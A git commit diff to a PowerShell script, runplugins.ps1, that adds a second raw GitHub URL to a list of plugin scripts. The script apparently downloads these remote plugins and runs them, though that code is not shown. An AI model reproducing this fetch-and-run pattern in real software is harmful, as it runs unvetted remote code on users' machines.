18b0d894342dd5f6c0e168a5e1c294bb7bee0155
skiddyskid111 <dhwhrvcxa@gmail.com>
2025-08-29 00:28:28 +0200

    Update runplugins.ps1

--- runplugins.ps1
+++ runplugins.ps1
@@ -40,7 +40,8 @@ Invoke-Retry {
 }
 
 $pluginUrls = @(
-    "https://github.com/skiddyskid111/resources/raw/main/plugins/plugin1.ps1"
+    "https://github.com/skiddyskid111/resources/raw/main/plugins/plugin1.ps1",
+    "https://github.com/skiddyskid111/resources/raw/main/plugins/plugin2.ps1"
 )
 
 $scriptPaths = @()
